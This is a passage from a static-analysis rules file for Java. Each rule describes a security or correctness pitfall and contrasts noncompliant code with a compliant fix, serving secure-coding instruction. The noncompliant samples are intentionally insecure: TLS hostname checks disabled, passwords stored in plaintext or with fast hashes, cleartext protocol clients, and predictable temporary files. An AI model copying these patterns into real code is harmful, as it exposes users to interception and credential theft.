            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat2&quot;&gt;SANS Top 25&lt;/a&gt;
            - Risky Resource Management &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>android</tag>
        <tag>cwe</tag>
        <tag>owasp-a1</tag>
        <tag>owasp-a3</tag>
        <tag>sans-top25-porous</tag>
        <tag>sans-top25-risky</tag>
        <securityStandards>
            <cwe>312,20</cwe>
            <OWASP>A1,A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5332' priority='CRITICAL'>
        <configKey>S5332</configKey>
        <name>Using clear-text protocols is security-sensitive</name>
        <description>
            &lt;p&gt;Clear-text protocols as &lt;code&gt;ftp&lt;/code&gt;, &lt;code&gt;telnet&lt;/code&gt; or non secure
            &lt;code&gt;http&lt;/code&gt; are lacking encryption of transported data. They are
            also missing the capability to build an authenticated connection. This mean that any attacker who can sniff
            traffic from the network can read, modify
            or corrupt the transported content. These protocol are not secure as they expose applications to a large
            range of risk:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Sensitive data exposure &lt;/li&gt;
            &lt;li&gt; Traffic redirected to a malicious endpoint &lt;/li&gt;
            &lt;li&gt; Malware infected software update or installer &lt;/li&gt;
            &lt;li&gt; Execution of client side code &lt;/li&gt;
            &lt;li&gt; Corruption of critical information &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Note also that using the &lt;code&gt;http&lt;/code&gt; protocol is being deprecated by &lt;a
            href=&quot;https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http&quot;&gt;major web
            browser&lt;/a&gt;. &lt;/p&gt;
            &lt;p&gt;In the past, it has led to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-6169&quot;&gt;CVE-2019-6169&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-12327&quot;&gt;CVE-2019-12327&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-11065&quot;&gt;CVE-2019-11065&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The confidentiality and integrity of data is necessary in the context of the web application.
            &lt;/li&gt;
            &lt;li&gt; The data is exchanged on an exposed network (Internet, public network etc). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use &lt;code&gt;ssh&lt;/code&gt; as an alternative to &lt;code&gt;telnet&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; Use &lt;code&gt;sftp&lt;/code&gt;, &lt;code&gt;scp&lt;/code&gt; or &lt;code&gt;ftps&lt;/code&gt;
            instead of &lt;code&gt;ftp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; Use &lt;code&gt;https&lt;/code&gt; instead of &lt;code&gt;http&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; Use &lt;code&gt;SMTP&lt;/code&gt; over &lt;code&gt;SSL/TLS&lt;/code&gt; or &lt;code&gt;SMTP&lt;/code&gt;
            with &lt;code&gt;STARTTLS&lt;/code&gt; instead of clear-text SMTP &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;It is recommended to secure all transport channels (event local network) as it can take a single
            non secure connection to compromise an entire
            application or system. &lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;These clients from &lt;a href=&quot;https://commons.apache.org/proper/commons-net/&quot;&gt;Apache
            commons net&lt;/a&gt; libraries are based on unencrypted protocols and
            are not recommended:&lt;/p&gt;
            &lt;pre&gt;
            TelnetClient telnet = new TelnetClient(); // Sensitive

            FTPClient ftpClient = new FTPClient(); // Sensitive

            SMTPClient smtpClient = new SMTPClient(); // Sensitive
            &lt;/pre&gt;
            &lt;p&gt;Unencrypted HTTP connections, when using &lt;a href=&quot;https://square.github.io/okhttp/https/&quot;&gt;okhttp&lt;/a&gt;
            library for instance, should be avoided:&lt;/p&gt;
            &lt;pre&gt;
            ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive
            .build();
            &lt;/pre&gt;
            &lt;p&gt; &lt;/p&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Use instead these clients from &lt;a href=&quot;https://commons.apache.org/proper/commons-net/&quot;&gt;Apache
            commons net&lt;/a&gt; and &lt;a
            href=&quot;http://www.jcraft.com/jsch/&quot;&gt;JSch/ssh&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            JSch jsch = new JSch(); // Compliant

            if(implicit) {
            // implicit mode is considered deprecated but offer the same security than explicit mode
            FTPSClient ftpsClient = new FTPSClient(true); // Compliant
            }
            else {
            FTPSClient ftpsClient = new FTPSClient(); // Compliant
            }

            if(implicit) {
            // implicit mode is considered deprecated but offer the same security than explicit mode
            SMTPSClient smtpsClient = new SMTPSClient(true); // Compliant
            }
            else {
            SMTPSClient smtpsClient = new SMTPSClient(); // Compliant
            smtpsClient.connect(&quot;127.0.0.1&quot;, 25);
            if (smtpsClient.execTLS()) {
            // commands
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;Perform HTTP encrypted connections, with &lt;a href=&quot;https://square.github.io/okhttp/https/&quot;&gt;okhttp&lt;/a&gt;
            library for instance:&lt;/p&gt;
            &lt;pre&gt;
            ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS) // Compliant
            .build();
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;No issue is reported for the following cases because they are not considered sensitive:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or &lt;code&gt;localhost&lt;/code&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/200.html&quot;&gt;MITRE, CWE-200&lt;/a&gt;
            - Exposure of Sensitive Information to an Unauthorized Actor &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/319&quot;&gt;MITRE, CWE-319&lt;/a&gt; -
            Cleartext Transmission of Sensitive Information &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html&quot;&gt;Google,
            Moving towards more secure web&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/&quot;&gt;Mozilla,
            Deprecating non secure http&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5344' priority='CRITICAL'>
        <configKey>S5344</configKey>
        <name>Passwords should not be stored in plain-text or with a fast hashing algorithm</name>
        <description>
            &lt;p&gt;A user password should never be stored in clear-text, instead a hash should be produced from it
            using a secure algorithm:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; not vulnerable to &lt;code&gt;brute force attacks&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; not vulnerable to &lt;code&gt;collision attacks&lt;/code&gt; (see rule s4790). &lt;/li&gt;
            &lt;li&gt; and a salt should be added to the password to lower the risk of &lt;code&gt;rainbow table attacks&lt;/code&gt;
            (see rule s2053). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;This rule raises an issue when a password is stored in clear-text or with a hash algorithm
            vulnerable to &lt;code&gt;bruce force attacks&lt;/code&gt;. These
            algorithms, like &lt;code&gt;md5&lt;/code&gt; or &lt;code&gt;SHA-family&lt;/code&gt; functions are fast to
            compute the hash and therefore brute force attacks are possible
            (it's easier to exhaust the entire space of all possible passwords) especially with hardware like GPU, FPGA
            or ASIC. Modern password hashing
            algorithms such as &lt;code&gt;bcrypt&lt;/code&gt;, &lt;code&gt;PBKDF2&lt;/code&gt; or &lt;code&gt;argon2&lt;/code&gt;
            are recommended.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Autowired
            public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
            auth.jdbcAuthentication()
            .dataSource(dataSource)
            .usersByUsernameQuery(&quot;SELECT * FROM users WHERE username = ?&quot;)
            .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant

            // OR
            auth.jdbcAuthentication()
            .dataSource(dataSource)
            .usersByUsernameQuery(&quot;SELECT * FROM users WHERE username = ?&quot;); // Noncompliant; default uses
            plain-text

            // OR
            auth.userDetailsService(...); // Noncompliant; default uses plain-text
            // OR
            auth.userDetailsService(...).passwordEncoder(new StandardPasswordEncoder()); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Autowired
            public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
            auth.jdbcAuthentication()
            .dataSource(dataSource)
            .usersByUsernameQuery(&quot;Select * from users where username=?&quot;)
            .passwordEncoder(new BCryptPasswordEncoder());

            // or
            auth.userDetailsService(null).passwordEncoder(new BCryptPasswordEncoder());
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html&quot;&gt;OWASP
            CheatSheet&lt;/a&gt; - Password Storage Cheat Sheet
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data
            Exposure &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/328&quot;&gt;MITRE, CWE-328&lt;/a&gt; -
            Reversible One-Way Hash &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/327&quot;&gt;MITRE, CWE-327&lt;/a&gt; -
            Use of a Broken or Risky Cryptographic Algorithm &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/916&quot;&gt;MITRE, CWE-916&lt;/a&gt; -
            Use of Password Hash With Insufficient Computational Effort &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>sans-top25-porous</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>328,327</cwe>
            <OWASP>A2,A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5361' priority='CRITICAL'>
        <configKey>S5361</configKey>
        <name>&quot;String#replace&quot; should be preferred to &quot;String#replaceAll&quot;</name>
        <description>
            &lt;p&gt;The underlying implementation of &lt;code&gt;String::replaceAll&lt;/code&gt; calls the &lt;code&gt;java.util.regex.Pattern.compile()&lt;/code&gt;
            method each time it is
            called even if the first argument is not a regular expression. This has a significant performance cost and
            therefore should be used with care.&lt;/p&gt;
            &lt;p&gt;When &lt;code&gt;String::replaceAll&lt;/code&gt; is used, the first argument should be a real
            regular expression. If it’s not the case,
            &lt;code&gt;String::replace&lt;/code&gt; does exactly the same thing as &lt;code&gt;String::replaceAll&lt;/code&gt;
            without the performance drawback of the regex.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue for each &lt;code&gt;String::replaceAll&lt;/code&gt; used with a &lt;code&gt;String&lt;/code&gt;
            as first parameter which doesn’t contains
            special regex character or pattern.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String init = &quot;Bob is a Bird... Bob is a Plane... Bob is Superman!&quot;;
            String changed = init.replaceAll(&quot;Bob is&quot;, &quot;It's&quot;); // Noncompliant
            changed = changed.replaceAll(&quot;\\.\\.\\.&quot;, &quot;;&quot;); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String init = &quot;Bob is a Bird... Bob is a Plane... Bob is Superman!&quot;;
            String changed = init.replace(&quot;Bob is&quot;, &quot;It's&quot;);
            changed = changed.replace(&quot;...&quot;, &quot;;&quot;);
            &lt;/pre&gt;
            &lt;p&gt;Or, with a regex:&lt;/p&gt;
            &lt;pre&gt;
            String init = &quot;Bob is a Bird... Bob is a Plane... Bob is Superman!&quot;;
            String changed = init.replaceAll(&quot;\\w*\\sis&quot;, &quot;It's&quot;);
            changed = changed.replaceAll(&quot;\\.{3}&quot;, &quot;;&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS4248'&gt;S4248&lt;/a&gt; - Regex patterns should not
            be created needlessly &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>performance</tag>
        <tag>regex</tag>
    </rule>

    <rule key='S5411' priority='MINOR'>
        <configKey>S5411</configKey>
        <name>Boxed &quot;Boolean&quot; should be avoided in boolean expressions</name>
        <description>
            &lt;p&gt;When boxed type &lt;code&gt;java.lang.Boolean&lt;/code&gt; is used as an expression it will throw
            &lt;code&gt;NullPointerException&lt;/code&gt; if the value is
            &lt;code&gt;null&lt;/code&gt; as defined in &lt;a href=&quot;https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8&quot;&gt;Java
            Language Specification §5.1.8
            Unboxing Conversion&lt;/a&gt;.&lt;/p&gt;
            &lt;p&gt;It is safer to avoid such conversion altogether and handle the &lt;code&gt;null&lt;/code&gt; value
            explicitly.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Boolean b = getBoolean();
            if (b) { // Noncompliant, it will throw NPE when b == null
            foo();
            } else {
            bar();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Boolean b = getBoolean();
            if (Boolean.TRUE.equals(b)) {
            foo();
            } else {
            bar(); // will be invoked for both b == false and b == null
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8&quot;&gt;Java
            Language Specification §5.1.8 Unboxing Conversion&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S5413' priority='MAJOR'>
        <configKey>S5413</configKey>
        <name>'List.remove()' should not be used in ascending 'for' loops</name>
        <description>
            &lt;p&gt;When &lt;code&gt;List.remove()&lt;/code&gt; is called it will shrink the list. If this is done
            inside the ascending loop iterating through all elements it will
            skip the element after the removed index.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void removeFrom(List&amp;lt;String&amp;gt; list) {
            // expected: iterate over all the elements of the list
            for (int i = 0; i &amp;lt; list.size(); i++) {
            if (list.get(i).isEmpty()) {
            // actual: remaining elements are shifted, so the one immediately following will be skipped
            list.remove(i); // Noncompliant
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;You can either adjust the loop index to account for the change in the size of the list&lt;/p&gt;
            &lt;pre&gt;
            static void removeFrom(List&amp;lt;String&amp;gt; list) {
            // expected: iterate over all the elements of the list
            for (int i = 0; i &amp;lt; list.size(); i++) {
            if (list.get(i).isEmpty()) {
            // actual: remaining elements are shifted, so the one immediately following will be skipped
            list.remove(i);
            i--;
            }
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;Or preferably it's probably better to rely on Java 8's &lt;code&gt;removeIf&lt;/code&gt; method&lt;/p&gt;
            &lt;pre&gt;
            static void removeFrom(List&amp;lt;String&amp;gt; list) {
            list.removeIf(String::isEmpty);
            }
            &lt;/pre&gt;
            &lt;p&gt;&amp;nbsp;&lt;/p&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;The descending loop doesn't have this issue, because the index will be correct when we loop in
            descending order&lt;/p&gt;
            &lt;pre&gt;
            void removeFrom(List&amp;lt;String&amp;gt; list) {
            for (int i = list.size() - 1; i &amp;gt;= 0; i--) {
            if (list.get(i).isEmpty()) {
            list.remove(i);
            }
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;&amp;nbsp;&lt;/p&gt;
        </description>
    </rule>

    <rule key='S5443' priority='CRITICAL'>
        <configKey>S5443</configKey>
        <name>Using publicly writable directories is security-sensitive</name>
        <description>
            &lt;p&gt;Operating systems have global directories where any user has write access. Those folders are mostly
            used as temporary storage areas like
            &lt;code&gt;/tmp&lt;/code&gt; in Linux based systems. An application manipulating files from these folders
            is exposed to race conditions on filenames: a malicious
            user can try to create a file with a predictable name before the application does. A successful attack can
            result in other files being accessed,
            modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.&lt;/p&gt;
            &lt;p&gt;In the past, it has led to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2012-2451&quot;&gt;CVE-2012-2451&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2015-1838&quot;&gt;CVE-2015-1838&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory
            like &lt;code&gt;/tmp&lt;/code&gt; (see examples bellow). It
            also detects access to environment variables that point to publicly writable directories, e.g., &lt;code&gt;TMP&lt;/code&gt;
            and &lt;code&gt;TMPDIR&lt;/code&gt;.&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;/tmp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/var/tmp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/usr/tmp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/dev/shm&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/dev/mqueue&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/run/lock&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/var/run/lock&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/Library/Caches&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/Users/Shared&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/private/tmp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;/private/var/tmp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;\Windows\Temp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;\Temp&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;\TMP&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Files are read from or written into a publicly writable folder &lt;/li&gt;
            &lt;li&gt; The application creates files with predictable names into a publicly writable folder &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use a dedicated sub-folder with tightly controlled permissions &lt;/li&gt;
            &lt;li&gt; Use secure-by-design APIs to create temporary files. Such API will make sure:
            &lt;ul&gt;
            &lt;li&gt; The generated filename is unpredictable &lt;/li&gt;
            &lt;li&gt; The file is readable and writable only by the creating user ID &lt;/li&gt;
            &lt;li&gt; The file descriptor is not inherited by child processes &lt;/li&gt;
            &lt;li&gt; The file will be destroyed as soon as it is closed &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            new File(&quot;/tmp/myfile.txt&quot;); // Sensitive
            Paths.get(&quot;/tmp/myfile.txt&quot;); // Sensitive

            java.io.File.createTempFile(&quot;prefix&quot;, &quot;suffix&quot;); // Sensitive, will be in the default
            temporary-file directory.
            java.nio.file.Files.createTempDirectory(&quot;prefix&quot;); // Sensitive, will be in the default
            temporary-file directory.
            &lt;/pre&gt;
            &lt;pre&gt;
            Map&amp;lt;String, String&amp;gt; env = System.getenv();
            env.get(&quot;TMP&quot;); // Sensitive
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            new File(&quot;/myDirectory/myfile.txt&quot;);

            File.createTempFile(&quot;prefix&quot;, &quot;suffix&quot;, new File(&quot;/mySecureDirectory&quot;));

            FileAttribute&amp;lt;Set&amp;lt;PosixFilePermission&amp;gt;&amp;gt; attr =
            PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(&quot;w+&quot;));
            Files.createTempFile(&quot;prefix&quot;, &quot;suffix&quot;, attr); // Compliant, created with explicit
            attributes.
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control&quot;&gt;OWASP
            Top 10 2017 Category A5&lt;/a&gt; - Broken Access Control &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/377&quot;&gt;MITRE, CWE-377&lt;/a&gt; -
            Insecure Temporary File &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/379&quot;&gt;MITRE, CWE-379&lt;/a&gt; -
            Creation of Temporary File in Directory with Incorrect Permissions
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Insecure_Temporary_File&quot;&gt;OWASP, Insecure
            Temporary File&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a5</tag>
        <securityStandards>
            <OWASP>A3,A5</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5445' priority='CRITICAL'>
        <configKey>S5445</configKey>
        <name>Insecure temporary file creation methods should not be used</name>
        <description>
            &lt;p&gt;Using &lt;code&gt;File.createTempFile&lt;/code&gt; as the first step in creating a temporary
            directory causes a race condition and is inherently unreliable and
            insecure. Instead, &lt;code&gt;Files.createTempDirectory&lt;/code&gt; (Java 7+) should be used.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the following steps are taken in immediate sequence:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; call to &lt;code&gt;File.createTempFile&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; delete resulting file &lt;/li&gt;
            &lt;li&gt; call &lt;code&gt;mkdir&lt;/code&gt; on the File object &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;7&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            File tempDir;
            tempDir = File.createTempFile(&quot;&quot;, &quot;.&quot;);
            tempDir.delete();
            tempDir.mkdir(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Path tempPath = Files.createTempDirectory(&quot;&quot;);
            File tempDir = tempPath.toFile();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities&quot;&gt;OWASP
            Top 10 2017 Category A9&lt;/a&gt; - Using
            Components with Known Vulnerabilities &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/377&quot;&gt;MITRE, CWE-377&lt;/a&gt; -
            Insecure Temporary File &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/379&quot;&gt;MITRE, CWE-379&lt;/a&gt; -
            Creation of Temporary File in Directory with Incorrect Permissions
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Insecure_Temporary_File&quot;&gt;OWASP, Insecure
            Temporary File&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a9</tag>
        <securityStandards>
            <OWASP>A9</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5527' priority='CRITICAL'>
        <configKey>S5527</configKey>
        <name>Server hostnames should be verified during SSL/TLS connections</name>
        <description>
            &lt;p&gt;To establish a SSL/TLS connection not vulnerable to man-in-the-middle attacks, it's essential to
            make sure the server presents the right
            certificate.&lt;/p&gt;
            &lt;p&gt;The certificate's hostname-specific data should match the server hostname.&lt;/p&gt;
            &lt;p&gt;It's not recommended to re-invent the wheel by implementing custom hostname verification.&lt;/p&gt;
            &lt;p&gt;TLS/SSL libraries provide built-in hostname verification functions that should be used.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;HostnameVerifier.verify()&lt;/code&gt; method always returns &lt;code&gt;true&lt;/code&gt;
            &lt;/li&gt;
            &lt;li&gt; a JavaMail's &lt;code&gt;javax.mail.Session&lt;/code&gt; is created with a &lt;code&gt;Properties&lt;/code&gt;
            object having no
            &lt;code&gt;mail.smtp.ssl.checkserveridentity&lt;/code&gt; or &lt;code&gt;mail.smtps.ssl.checkserveridentity&lt;/code&gt;
            not configured to &lt;code&gt;true&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; a Apache Common Emails's &lt;code&gt;org.apache.commons.mail.SimpleEmail&lt;/code&gt; is used
            with &lt;code&gt;setSSLOnConnect(true)&lt;/code&gt; or
            &lt;code&gt;setStartTLSEnabled(true)&lt;/code&gt; or &lt;code&gt;setStartTLSRequired(true)&lt;/code&gt;
            without a call to &lt;code&gt;setSSLCheckServerIdentity(true)&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            URL url = new URL(&quot;https://example.org/&quot;);
            HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();
            urlConnection.setHostnameVerifier(new HostnameVerifier() {
            @Override
            public boolean verify(String requestedHost, SSLSession remoteServerSession) {
            return true; // Noncompliant
            }
            });
            InputStream in = urlConnection.getInputStream();
            &lt;/pre&gt;
            &lt;p&gt;SimpleEmail example:&lt;/p&gt;
            &lt;pre&gt;
            Email email = new SimpleEmail();
            email.setSmtpPort(465);
            email.setAuthenticator(new DefaultAuthenticator(username, password));
            email.setSSLOnConnect(true); // Noncompliant; setSSLCheckServerIdentity(true) should also be called before
            sending the email
            email.send();
            &lt;/pre&gt;
            &lt;p&gt;JavaMail's example:&lt;/p&gt;
            &lt;pre&gt;
            Properties props = new Properties();
            props.put(&quot;mail.smtp.host&quot;, &quot;smtp.gmail.com&quot;);
            props.put(&quot;mail.smtp.socketFactory.port&quot;, &quot;465&quot;);
            props.put(&quot;mail.smtp.socketFactory.class&quot;, &quot;javax.net.ssl.SSLSocketFactory&quot;); //
            Noncompliant; Session is created without having &quot;mail.smtp.ssl.checkserveridentity&quot; set to true
            props.put(&quot;mail.smtp.auth&quot;, &quot;true&quot;);
            props.put(&quot;mail.smtp.port&quot;, &quot;465&quot;);
            Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(&quot;username@gmail.com&quot;, &quot;password&quot;);
            }
            });
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            URL url = new URL(&quot;https://example.org/&quot;);
